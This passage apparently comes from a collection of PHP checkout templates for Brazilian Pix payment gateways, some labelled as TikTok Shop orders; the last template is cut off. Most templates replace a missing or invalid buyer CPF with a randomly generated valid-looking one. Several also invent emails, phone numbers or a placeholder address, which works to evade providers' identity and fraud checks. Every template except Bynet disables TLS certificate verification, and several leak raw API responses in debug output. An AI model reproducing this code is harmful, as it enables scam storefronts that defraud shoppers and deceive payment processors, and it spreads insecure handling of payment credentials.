header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
ob_start();

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }

$apiToken = '{{KEY_SECRET}}'; // O token FastSoft é o segredo
$publicKey = 'x'; // Usado como placeholder para Basic Auth x:token

if (empty($apiToken)) { 
    ob_end_clean(); 
    echo json_encode(['success'=>false, 'message'=>'Erro: API Token FastSoft não configurado.']); 
    exit; 
}

function gerarCpfValido() {
    $n = []; for ($i = 0; $i < 9; $i++) $n[$i] = rand(0, 9);
    $d1 = 0; for ($i = 0; $i < 9; $i++) $d1 += $n[$i] * (10 - $i);
    $r1 = $d1 % 11; $d1 = ($r1 < 2) ? 0 : 11 - $r1;
    $d2 = 0; for ($i = 0; $i < 9; $i++) $d2 += $n[$i] * (11 - $i);
    $d2 += $d1 * 2; $r2 = $d2 % 11; $d2 = ($r2 < 2) ? 0 : 11 - $r2;
    return implode('', $n) . $d1 . $d2;
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) { ob_end_clean(); echo json_encode(['success'=>false, 'message'=>'Sem dados']); exit; }

$amount = (int)round(($input['amount'] ?? 0) * 100);
$cpfInput = preg_replace('/\\D/', '', $input['cpf'] ?? '');
$isValidFormat = (strlen($cpfInput) == 11 && !preg_match('/^(\\d)\\1{10}$/', $cpfInput));
$cpf = $isValidFormat ? $cpfInput : gerarCpfValido();

$name = $input['customer']['name'] ?? 'Cliente';
$email = $input['customer']['email'] ?? 'cliente@email.com';
$phone = preg_replace('/\\D/', '', $input['customer']['phone'] ?? '') ?: '11999999999';
$clickId = $input['click_id'] ?? '';

// FastSoft utiliza o valor em centavos
$payload = [
    'amount' => $amount, 
    'paymentMethod' => 'pix',
    'customer' => [
        'name' => $name, 
        'email' => $email, 
        'phone' => $phone, 
        'document' => ['type' => 'cpf', 'number' => $cpf]
    ],
    // Adicione o click_id para rastreamento, se o FastSoft suportar metadados
    'metadata' => ['checkout_source' => 'tiktok_editor', 'click_id' => $clickId] 
];

$url = 'https://api.fastsoftbrasil.com/v1/transactions';
// Cria o header Basic Auth com "x:TOKEN" e codifica em base64
$auth = base64_encode("{$publicKey}:{$apiToken}"); 

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json', 
    'Authorization: Basic ' . $auth // <-- Uso do Basic Auth
]);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

$res = json_decode($result, true);
// O código PIX (chave copia e cola) e a imagem devem vir da resposta da API
$pixCode = $res['pix']['qrcode_emv'] ?? null; 

ob_end_clean();

if ($pixCode) {
    // URL do QR Code, se não vier, geramos uma padrão
    $qrImage = $res['pix']['qrcode_url'] ?? 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' . urlencode($pixCode);
    echo json_encode(['success'=>true, 'pix_code'=>$pixCode, 'qr_image'=>$qrImage]);
} else {
    echo json_encode(['success'=>false, 'message'=>'Erro FastSoft', 'api_response'=>$res]);
}
?>`,

    sourcepay: `<?php
error_reporting(0);
ini_set('display_errors', 0);
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
ob_start();

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }

$publicKey = '{{KEY_PUBLIC}}';
$secretKey = '{{KEY_SECRET}}';

function gerarCpfValido() {
    $n = []; for ($i = 0; $i < 9; $i++) $n[$i] = rand(0, 9);
    $d1 = 0; for ($i = 0; $i < 9; $i++) $d1 += $n[$i] * (10 - $i);
    $r1 = $d1 % 11; $d1 = ($r1 < 2) ? 0 : 11 - $r1;
    $d2 = 0; for ($i = 0; $i < 9; $i++) $d2 += $n[$i] * (11 - $i);
    $d2 += $d1 * 2; $r2 = $d2 % 11; $d2 = ($r2 < 2) ? 0 : 11 - $r2;
    return implode('', $n) . $d1 . $d2;
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) { ob_end_clean(); echo json_encode(['success'=>false, 'message'=>'Sem dados']); exit; }

$amount = (int)round(($input['amount'] ?? 0) * 100);
$cpfInput = preg_replace('/\\D/', '', $input['cpf'] ?? '');
$isValidFormat = (strlen($cpfInput) == 11 && !preg_match('/^(\\d)\\1{10}$/', $cpfInput));
$cpf = $isValidFormat ? $cpfInput : gerarCpfValido();

$name = $input['customer']['name'] ?? 'Cliente';
$email = $input['customer']['email'] ?? 'cliente@email.com';

$url = 'https://api.sourcepay.com.br/v1/transactions';
$auth = base64_encode("$publicKey:$secretKey");

$payload = [
    'amount' => $amount,
    'paymentMethod' => 'pix',
    'customer' => [ 'name' => $name, 'email' => $email, 'document' => ['type' => 'cpf', 'number' => $cpf] ],
    'items' => [['title' => 'Pedido', 'unitPrice' => $amount, 'quantity' => 1, 'tangible' => false]]
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json', 'Authorization: Basic ' . $auth]);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

$res = json_decode($result, true);
$pixCode = $res['pix']['qrcode'] ?? null;

ob_end_clean();

if ($pixCode) {
    $qrImage = $res['pix']['qrcode_url'] ?? 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' . urlencode($pixCode);
    echo json_encode(['success'=>true, 'pix_code'=>$pixCode, 'qr_image'=>$qrImage]);
} else {
    echo json_encode(['success'=>false, 'message'=>'Erro SourcePay', 'debug'=>$res]);
}
?>`,

    freepay: `<?php
error_reporting(0);
ini_set('display_errors', 0);
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
ob_start();

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }

$username = '{{KEY_PUBLIC}}'; 
$password = '{{KEY_SECRET}}';

if (empty($username) || empty($password)) { ob_end_clean(); echo json_encode(['success'=>false, 'message'=>'Credenciais FreePay incompletas']); exit; }

function gerarCpfValido() {
    $n = []; for ($i = 0; $i < 9; $i++) $n[$i] = rand(0, 9);
    $d1 = 0; for ($i = 0; $i < 9; $i++) $d1 += $n[$i] * (10 - $i);
    $r1 = $d1 % 11; $d1 = ($r1 < 2) ? 0 : 11 - $r1;
    $d2 = 0; for ($i = 0; $i < 9; $i++) $d2 += $n[$i] * (11 - $i);
    $d2 += $d1 * 2; $r2 = $d2 % 11; $d2 = ($r2 < 2) ? 0 : 11 - $r2;
    return implode('', $n) . $d1 . $d2;
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) { ob_end_clean(); echo json_encode(['success'=>false, 'message'=>'Sem dados']); exit; }

$amount = (int)round(($input['amount'] ?? 0) * 100);
$cpfInput = preg_replace('/\\D/', '', $input['cpf'] ?? '');
$isValidFormat = (strlen($cpfInput) == 11 && !preg_match('/^(\\d)\\1{10}$/', $cpfInput));
$cpf = $isValidFormat ? $cpfInput : gerarCpfValido();

$name = $input['customer']['name'] ?? 'Cliente';
$email = $input['customer']['email'] ?? 'cliente@email.com';
$phone = $input['customer']['phone'] ?? '11999999999';

$cleanItems = [];
$inputItems = $input['items'] ?? [];
if(!empty($inputItems)) {
    foreach($inputItems as $item) {
        $cleanItems[] = [
            'title' => substr($item['title'], 0, 250),
            'unit_price' => (int)round((float)$item['unit_price'] * 100),
            'quantity' => (int)$item['quantity'],
            'tangible' => false
        ];
    }
} else {
    $cleanItems[] = ['title' => 'Pedido', 'unit_price' => $amount, 'quantity' => 1, 'tangible' => false];
}

$url = 'https://api.freepaybrasil.com/v1/payment-transaction/create';
$auth = base64_encode("$username:$password");

$payload = [
    'amount' => $amount,
    'payment_method' => 'pix',
    'postback_url' => 'https://webhook.site/retorno', 
    'metadata' => ['origem' => 'checkout_v2'],
    'customer' => [
        'name' => $name, 'email' => $email, 'phone' => $phone,
        'document' => ['type' => 'cpf', 'number' => $cpf]
    ],
    'items' => $cleanItems
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json', 'Authorization: Basic ' . $auth]);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

$res = json_decode($result, true);

function findPix($arr) {
    if (!is_array($arr)) return null;
    if (isset($arr['payment_method']['qr_code']['emv'])) return $arr['payment_method']['qr_code']['emv'];
    if (isset($arr['data']['payment_method']['qr_code']['emv'])) return $arr['data']['payment_method']['qr_code']['emv'];
    foreach ($arr as $k => $v) {
        if (is_string($v) && strpos($v, '000201') === 0) return $v;
        if (is_array($v)) { $f = findPix($v); if ($f) return $f; }
    }
    return null;
}
$pixCode = findPix($res);

ob_end_clean();

if ($pixCode) {
    $qrImage = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' . urlencode($pixCode);
    if (isset($res['payment_method']['qr_code']['url'])) $qrImage = $res['payment_method']['qr_code']['url'];
    echo json_encode(['success'=>true, 'pix_code'=>$pixCode, 'qr_image'=>$qrImage]);
} else {
    $debugStr = json_encode($res);
    if(strlen($debugStr) > 500) $debugStr = substr($debugStr, 0, 500) . '...';
    echo json_encode(['success'=>false, 'message'=>'Pagamento criado, mas código Pix não encontrado.', 'debug_msg'=> $debugStr]);
}
?>`,

    kingpay: `<?php
error_reporting(0);
ini_set('display_errors', 0);
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
ob_start();

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }

$secretKey = '{{KEY_SECRET}}';

if (empty($secretKey)) { ob_end_clean(); echo json_encode(['success'=>false, 'message'=>'Erro: Secret Key não configurada.']); exit; }

function gerarCpfValido() {
    $n = []; for ($i = 0; $i < 9; $i++) $n[$i] = rand(0, 9);
    $d1 = 0; for ($i = 0; $i < 9; $i++) $d1 += $n[$i] * (10 - $i);
    $r1 = $d1 % 11; $d1 = ($r1 < 2) ? 0 : 11 - $r1;
    $d2 = 0; for ($i = 0; $i < 9; $i++) $d2 += $n[$i] * (11 - $i);
    $d2 += $d1 * 2; $r2 = $d2 % 11; $d2 = ($r2 < 2) ? 0 : 11 - $r2;
    return implode('', $n) . $d1 . $d2;
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) { ob_end_clean(); echo json_encode(['success'=>false, 'message'=>'Sem dados']); exit; }

$amount = (int)round(($input['amount'] ?? 0) * 100);
$cpfInput = preg_replace('/\\D/', '', $input['cpf'] ?? '');
$cpf = (strlen($cpfInput) == 11 && $cpfInput !== '00000000000') ? $cpfInput : gerarCpfValido();

$name = $input['customer']['name'] ?? 'Cliente';
$email = $input['customer']['email'] ?? 'cliente@email.com';
if ($email == 'cliente@email.com' || $email == 'compra@checkout.com') {
    $email = 'cliente.' . rand(10000, 99999) . '@gmail.com';
}

$phoneRaw = preg_replace('/\\D/', '', $input['customer']['phone'] ?? '');
if (strlen($phoneRaw) >= 10 && substr($phoneRaw, 0, 2) !== '55') {
    $phone = '55' . $phoneRaw;
} else {
    $phone = $phoneRaw ?: '5511999999999';
}

$cleanItems = [];
$inputItems = $input['items'] ?? [];
if(!empty($inputItems)) {
    foreach($inputItems as $item) {
        $cleanItems[] = [
            'title' => substr($item['title'], 0, 250),
            'unitPrice' => (int)round((float)$item['unit_price'] * 100), 
            'quantity' => (int)$item['quantity'],
            'tangible' => false
        ];
    }
} else {
    $cleanItems[] = ['title' => 'Pedido', 'unitPrice' => $amount, 'quantity' => 1, 'tangible' => false];
}

$url = 'https://api.kingpaybr.com/functions/v1/transactions'; 
$auth = base64_encode("$secretKey:x");

$payload = [
    'amount' => $amount,
    'paymentMethod' => 'PIX',
    'installments' => 1,
    'customer' => [
        'name' => $name, 
        'email' => $email, 
        'phone' => $phone, 
        'document' => ['type'=>'CPF', 'number'=>$cpf] 
    ],
    'items' => $cleanItems
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json', 'Authorization: Basic ' . $auth]);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

$res = json_decode($result, true);

function findPix($arr) {
    foreach ($arr as $k => $v) {
        if (is_string($v) && strpos($v, '000201') === 0) return $v;
        if (is_array($v)) { $f = findPix($v); if ($f) return $f; }
    }
    return null;
}
$pixCode = findPix($res);

ob_end_clean();

if ($pixCode) {
    $qrImage = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' . urlencode($pixCode);
    echo json_encode(['success'=>true, 'pix_code'=>$pixCode, 'qr_image'=>$qrImage]);
} else {
    echo json_encode(['success'=>false, 'message'=>'Erro KingPay', 'debug_msg'=>json_encode($res)]);
}
?>`,
duttyfy: `<?php
error_reporting(0);
ini_set('display_errors', 0);
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
ob_start();

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }

$clientSecret = '{{KEY_SECRET}}';

if (empty($clientSecret)) { ob_end_clean(); echo json_encode(['success'=>false, 'message'=>'Erro: Client Secret não configurado.']); exit; }

function gerarCpfValido() {
    $n = []; for ($i = 0; $i < 9; $i++) $n[$i] = rand(0, 9);
    $d1 = 0; for ($i = 0; $i < 9; $i++) $d1 += $n[$i] * (10 - $i);
    $r1 = $d1 % 11; $d1 = ($r1 < 2) ? 0 : 11 - $r1;
    $d2 = 0; for ($i = 0; $i < 9; $i++) $d2 += $n[$i] * (11 - $i);
    $d2 += $d1 * 2; $r2 = $d2 % 11; $d2 = ($r2 < 2) ? 0 : 11 - $r2;
    return implode('', $n) . $d1 . $d2;
}

function validarCpf($cpf) {
    $cpf = preg_replace('/\\D/', '', $cpf);
    if (strlen($cpf) != 11 || preg_match('/^(\\d)\\1{10}$/', $cpf)) return false;
    for ($t = 9; $t < 11; $t++) {
        for ($d = 0, $c = 0; $c < $t; $c++) $d += $cpf[$c] * (($t + 1) - $c);
        $d = ((10 * $d) % 11) % 10;
        if ($cpf[$c] != $d) return false;
    }
    return true;
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) { ob_end_clean(); echo json_encode(['success'=>false, 'message'=>'Sem dados']); exit; }

$amount = (int)round(($input['amount'] ?? 0) * 100);
$cpfInput = preg_replace('/\\D/', '', $input['cpf'] ?? '');
$cpf = validarCpf($cpfInput) ? $cpfInput : gerarCpfValido();

$name = $input['customer']['name'] ?? 'Cliente';
$email = $input['customer']['email'] ?? 'cliente@email.com';
$phoneInput = preg_replace('/\\D/', '', $input['customer']['phone'] ?? '');

if (preg_match('/^\\d{10,11}$/', $phoneInput)) {
    $phone = $phoneInput;
} else {
    $ddd = rand(11, 99);
    $phone = (rand(0, 1) === 1) ? $ddd . "9" . rand(10000000, 99999999) : $ddd . rand(10000000, 99999999);
}

$payload = [
    "amount" => $amount,
    "description" => "Pedido Loja",
    "customer" => [
        "name" => $name,
        "document" => $cpf,
        "email" => $email,
        "phone" => $phone
    ],
    "item" => [
        "title" => "Pedido #" . time(),
        "price" => $amount,
        "quantity" => 1
    ],
    "paymentMethod" => "PIX",
    "utm" => "utm_source=checkout_pro"
];

$url = 'https://www.pagamentos-seguros.app/api-pix/';
$ch = curl_init($url . $clientSecret);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

$res = json_decode($result, true);
$pixCode = $res['pixCode'] ?? null;

ob_end_clean();

if ($pixCode) {
    $qrImage = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' . urlencode($pixCode);
    echo json_encode(['success'=>true, 'pix_code'=>$pixCode, 'qr_image'=>$qrImage]);
} else {
    $debugStr = json_encode($res);
    echo json_encode(['success'=>false, 'message'=>'Erro API', 'debug_msg'=>substr($debugStr, 0, 500)]);
}
?>`,

    pagflex: `<?php
error_reporting(0);
ini_set('display_errors', 0);
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
ob_start();

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }

$secretKey = '{{KEY_PUBLIC}}';
$companyId = '{{KEY_SECRET}}';

if (empty($secretKey) || empty($companyId)) { ob_end_clean(); echo json_encode(['success'=>false, 'message'=>'Erro: Credenciais PagFlex não configuradas.']); exit; }

function gerarCpfValido() {
    $n = []; for ($i = 0; $i < 9; $i++) $n[$i] = rand(0, 9);
    $d1 = 0; for ($i = 0; $i < 9; $i++) $d1 += $n[$i] * (10 - $i);
    $r1 = $d1 % 11; $d1 = ($r1 < 2) ? 0 : 11 - $r1;
    $d2 = 0; for ($i = 0; $i < 9; $i++) $d2 += $n[$i] * (11 - $i);
    $d2 += $d1 * 2; $r2 = $d2 % 11; $d2 = ($r2 < 2) ? 0 : 11 - $r2;
    return implode('', $n) . $d1 . $d2;
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) { ob_end_clean(); echo json_encode(['success'=>false, 'message'=>'Sem dados']); exit; }

$amount = (int)round(($input['amount'] ?? 0) * 100);
$cpfInput = preg_replace('/\\D/', '', $input['cpf'] ?? '');
$isValidFormat = (strlen($cpfInput) == 11 && !preg_match('/^(\\d)\\1{10}$/', $cpfInput));
$cpf = $isValidFormat ? $cpfInput : gerarCpfValido();

$name = $input['customer']['name'] ?? 'Cliente';
$email = $input['customer']['email'] ?? 'cliente@email.com';
$phone = preg_replace('/\\D/', '', $input['customer']['phone'] ?? '') ?: '11999999999';

$payload = [
    "amount" => $amount,
    "paymentMethod" => "PIX",
    "installments" => 1,
    "companyId" => $companyId,
    "customer" => [
        "name" => $name,
        "email" => $email,
        "phone" => $phone,
        "document" => $cpf
    ],
    "items" => [
        [
            "title" => "Pedido Site",
            "unitPrice" => $amount,
            "quantity" => 1,
            "externalRef" => uniqid()
        ]
    ]
];

$url = 'https://api.pagflexbrasil.com/functions/v1/transactions';
$auth = base64_encode($secretKey . ':' . $companyId);

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'Authorization: Basic ' . $auth
]);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

$res = json_decode($result, true);

function findPix($arr) {
    if (!is_array($arr)) return null;
    foreach ($arr as $k => $v) {
        if (is_string($v) && strpos($v, '000201') === 0) return $v;
        if (is_array($v)) { $f = findPix($v); if ($f) return $f; }
    }
    return null;
}

$pixCode = findPix($res);

ob_end_clean();

if ($pixCode) {
    $qrImage = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' . urlencode($pixCode);
    if(isset($res['data']['pix']['qrcode']) && filter_var($res['data']['pix']['qrcode'], FILTER_VALIDATE_URL)) {
        $qrImage = $res['data']['pix']['qrcode'];
    }
    echo json_encode(['success'=>true, 'pix_code'=>$pixCode, 'qr_image'=>$qrImage]);
} else {
    $debugStr = json_encode($res);
    if(strlen($debugStr) > 500) $debugStr = substr($debugStr, 0, 500) . '...';
    echo json_encode(['success'=>false, 'message'=>'Erro PagFlex', 'debug_msg'=>$debugStr]);
}
?>`,

    invictus: `<?php
error_reporting(0);
ini_set('display_errors', 0);
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
ob_start();

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }

$token = '{{KEY_TOKEN}}';
$fallbackHash = '{{KEY_PUBLIC}}'; 

if (empty($token)) { ob_end_clean(); echo json_encode(['success'=>false, 'message'=>'Erro: Token Invictus não configurado.']); exit; }

function gerarCpfValido() {
    $n = []; for ($i = 0; $i < 9; $i++) $n[$i] = rand(0, 9);
    $d1 = 0; for ($i = 0; $i < 9; $i++) $d1 += $n[$i] * (10 - $i);
    $r1 = $d1 % 11; $d1 = ($r1 < 2) ? 0 : 11 - $r1;
    $d2 = 0; for ($i = 0; $i < 9; $i++) $d2 += $n[$i] * (11 - $i);
    $d2 += $d1 * 2; $r2 = $d2 % 11; $d2 = ($r2 < 2) ? 0 : 11 - $r2;
    return implode('', $n) . $d1 . $d2;
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) { ob_end_clean(); echo json_encode(['success'=>false, 'message'=>'Sem dados']); exit; }

$amount = (int)round(($input['amount'] ?? 0) * 100);
$cpfInput = preg_replace('/\\D/', '', $input['cpf'] ?? '');
$isValidFormat = (strlen($cpfInput) == 11 && !preg_match('/^(\\d)\\1{10}$/', $cpfInput));
$cpf = $isValidFormat ? $cpfInput : gerarCpfValido();

$name = $input['customer']['name'] ?? 'Cliente';
$email = $input['customer']['email'] ?? 'cliente@email.com';
$phone = preg_replace('/\\D/', '', $input['customer']['phone'] ?? '') ?: '11999999999';

$createUrl = "https://api.invictuspay.app.br/api/public/v1/products?api_token=" . $token;
$createData = [
    "title" => "Pedido " . date('dmYHis'),
    "cover" => "https://placehold.co/500x500/png?text=Pedido",
    "sale_page" => "https://google.com",
    "payment_type" => 1,
    "product_type" => "digital",
    "delivery_type" => 1,
    "amount" => $amount 
];

$chC = curl_init($createUrl);
curl_setopt($chC, CURLOPT_POST, 1);
curl_setopt($chC, CURLOPT_POSTFIELDS, json_encode($createData));
curl_setopt($chC, CURLOPT_RETURNTRANSFER, true);
curl_setopt($chC, CURLOPT_HTTPHEADER, ['Content-Type: application/json', 'Accept: application/json']);
curl_setopt($chC, CURLOPT_SSL_VERIFYPEER, false);
$createResult = curl_exec($chC);
curl_close($chC);

$productRes = json_decode($createResult, true);
$finalHash = $fallbackHash; 
if (isset($productRes['hash'])) $finalHash = $productRes['hash'];
elseif (isset($productRes['data']['hash'])) $finalHash = $productRes['data']['hash'];

$url = "https://api.invictuspay.app.br/api/public/v1/transactions?api_token=" . $token;

$cart = [];
$inputItems = $input['items'] ?? [];
if(!empty($inputItems)) {
    foreach($inputItems as $item) {
        $cart[] = [
            'product_hash' => $finalHash,
            'title' => substr($item['title'], 0, 250),
            'price' => (int)round((float)$item['unit_price'] * 100),
            'quantity' => (int)$item['quantity'],
            'tangible' => false,
            'operation_type' => 1
        ];
    }
} else {
    $cart[] = ['product_hash'=>$finalHash, 'title' => 'Pedido', 'price' => $amount, 'quantity' => 1, 'tangible' => false, 'operation_type' => 1];
}

$payload = [
    'amount' => $amount,
    'payment_method' => 'pix',
    'offer_hash' => $finalHash, 
    'installments' => 1,
    'transaction_origin' => 'api',
    'customer' => [
        'name' => $name, 'email' => $email, 'document' => $cpf, 'phone_number' => $phone,
        'street_name' => 'Rua', 'number' => '1', 'neighborhood' => 'Centro', 'city' => 'Sao Paulo', 'state' => 'SP', 'zip_code' => '01001000'
    ],
    'cart' => $cart
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json', 'Accept: application/json']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

$res = json_decode($result, true);

function findPix($arr) {
    foreach ($arr as $k => $v) {
        if (is_string($v) && strpos($v, '000201') === 0) return $v;
        if (is_array($v)) { $f = findPix($v); if ($f) return $f; }
    }
    return null;
}
$pixCode = findPix($res);

ob_end_clean();

if ($pixCode) {
    $qrImage = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' . urlencode($pixCode);
    echo json_encode(['success'=>true, 'pix_code'=>$pixCode, 'qr_image'=>$qrImage]);
} else {
    echo json_encode(['success'=>false, 'message'=>'Erro Invictus', 'debug_msg'=>json_encode($res)]);
}
?>`,

    bynet: `<?php
header('Content-Type: application/json; charset=utf-8');

$BYNET_API_KEY = '{{KEY_PUBLIC}}';
$endpoint = 'https://api-gateway.techbynet.com/api/user/transactions';

$raw = file_get_contents('php://input');
$input = json_decode($raw, true);

$docNumber = preg_replace('/[^0-9]/', '', $input['cpf'] ?? '');
$customerData = $input['customer'] ?? [];

$payload = [
  "amount"        => (int)round(((float)($input['amount'] ?? 0)) * 100),
  "currency"      => "BRL",
  "paymentMethod" => "PIX",
  "installments"  => 1,
  "postbackUrl"   => "https://google.com",
  "ip"            => $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1',
  "customer" => [
    "name"     => $customerData['name'] ?? 'Cliente',
    "email"    => $customerData['email'] ?? 'cliente@email.com',
    "phone"    => "11999999999",
    "document" => ["number" => $docNumber, "type" => "CPF"],
    "address"  => [
      "street"       => "Endereco Nao Informado",
      "streetNumber" => "SN",
      "zipCode"      => "01001000",
      "neighborhood" => "Centro",
      "city"         => "Sao Paulo",
      "state"        => "SP",
      "country"      => "BR"
    ]
  ],
  "items" => [[
    "title"     => "Pedido TikTok Shop",
    "unitPrice" => (int)round(((float)($input['amount'] ?? 0)) * 100),
    "quantity"  => 1,
    "tangible"  => true
  ]],
  "pix" => ["expiresInDays" => 1]
];

$ch = curl_init($endpoint);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['x-api-key: ' . $BYNET_API_KEY, 'Content-Type: application/json']);
$response = curl_exec($ch);
curl_close($ch);

$bynetData = json_decode($response, true);
$data = $bynetData['data'] ?? [];
$pixCode = $data['qrCode'] ?? null;
if (!$pixCode && isset($data['pix'])) {
    $pixCode = $data['pix']['payload'] ?? $data['pix']['pixCopiaECola'] ?? null;
}

if ($pixCode) {
    echo json_encode(['success' => true, 'pix_code' => $pixCode, 'amount' => $input['amount']]);
} else {
    echo json_encode(['success' => false, 'message' => 'Erro ao processar pagamento', 'debug' => $bynetData]);
}
?>`,

    otimize: `<?php
error_reporting(0);
ini_set('display_errors', 0);
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
ob_start();

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }

$secretKey = '{{KEY_SECRET}}';

if (empty($secretKey) || $secretKey === '{{KEY_SECRET}}') { 
    ob_end_clean(); 
    echo json_encode(['success'=>false, 'message'=>'Erro: Chave Secreta Otimize nao configurada.']); 
    exit; 
}

function gerarCpfValido() {
    $n = []; for ($i = 0; $i < 9; $i++) $n[$i] = rand(0, 9);
    $d1 = 0; for ($i = 0; $i < 9; $i++) $d1 += $n[$i] * (10 - $i);
    $r1 = $d1 % 11; $d1 = ($r1 < 2) ? 0 : 11 - $r1;
    $d2 = 0; for ($i = 0; $i < 9; $i++) $d2 += $n[$i] * (11 - $i);
    $d2 += $d1 * 2; $r2 = $d2 % 11; $d2 = ($r2 < 2) ? 0 : 11 - $r2;
    return implode('', $n) . $d1 . $d2;
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) { ob_end_clean(); echo json_encode(['success'=>false, 'message'=>'Sem dados recebidos']); exit; }

$amount = (int)round(($input['amount'] ?? 0) * 100);
if ($amount < 100) { ob_end_clean(); echo json_encode(['success'=>false, 'message'=>'Valor minimo R$1,00']); exit; }

$cpfInput = preg_replace('/\\D/', '', $input['cpf'] ?? '');
$isValidFormat = (strlen($cpfInput) == 11 && !preg_match('/^(\\d)\\1{10}$/', $cpfInput));
$cpf = $isValidFormat ? $cpfInput : gerarCpfValido();

$name = trim($input['customer']['name'] ?? $input['name'] ?? 'Cliente');
$email = trim($input['customer']['email'] ?? $input['email'] ?? 'cliente@email.com');
$phone = preg_replace('/\\D/', '', $input['customer']['phone'] ?? $input['phone'] ?? '') ?: '11999999999';

// Payload conforme documentacao Otimize
$payload = [
    'amount' => $amount,
    'payment_method' => 'pix',
    'customer' => [
        'name' => $name, 
        'email' => $email, 
        'phone' => '+55' . $phone,
        'document' => $cpf,
        'document_type' => 'cpf'
    ],
    'pix' => [
        'expires_in' => 3600
    ],
    'items' => [[
        'title' => 'Pedido',
        'unit_price' => $amount,
        'quantity' => 1,
        'tangible' => false
    ]]
];

$url = 'https://api.otimizepagamentos.com/v1/transactions';
$auth = base64_encode("{$secretKey}:x");

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'Accept: application/json',
    'Authorization: Basic ' . $auth
]);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
